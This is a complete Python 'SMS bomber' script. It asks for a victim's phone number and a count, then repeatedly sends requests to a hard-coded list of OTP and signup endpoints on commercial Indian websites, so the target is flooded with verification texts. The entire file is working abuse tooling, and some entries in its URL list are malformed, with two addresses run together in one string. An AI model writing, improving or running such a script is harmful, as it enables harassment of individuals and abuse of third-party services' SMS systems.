from urllib.request import Request,urlopen
from urllib.parse import urlencode,quote_plus
import platform
import os
import time
import urllib
import urllib.request
import http.cookiejar

def banner():
    if platform.system().lower()=="windows":
        os.system("cls")
    else:
        os.system("clear")
    print(" SMS BOMBER ")


def send(num, counter, slep):
    url1 = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://www.goibibo.com/common/downloadsms/,https://myaccount.sulekha.com/network/userauthv1.aspx?mode=sendvcode&mobilenumber=","https://www.justdial.com/functions/ajxandroid.php","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=","http://www.spencers.in/genOtp/genOTP.php?action=genOTP&phone=","http://api.im.hike.in/v3/account/validate?digits=4","https://www.flipkart.com/api/6/user/signup/status","https://appapi.mobikwik.com/p/account/otp/cell","http://www.narendramodi.in/site/senddnldlink?contact_no=91%C2%A0","https://www.tatadocomo.com/INonRender/Personal_MydocomoApp/GenerateOTP?mobile=","https://myaccount.paisabazaar.com/my-account/","https://www.iffcobazar.in/login_otp.html,https://www.netmeds.com/sociallogin/popup/checkmobileno/" , "https://www.snapdeal.com/sendOTP"]
    data={"phone":num}
    x=y=0
    for y in range(int(counter)):
        for x in url1:
            banner()
            print("Target Number          : ", num)
            print("Number of Message Sent : ", y+1)
            result_url=str(x)+num
            resp1=Request(result_url)
            urlopen(resp1)
            time.sleep(slep) 

banner()
send(input("Enter Target Number : "), input("Enter number of Messages : "), 1)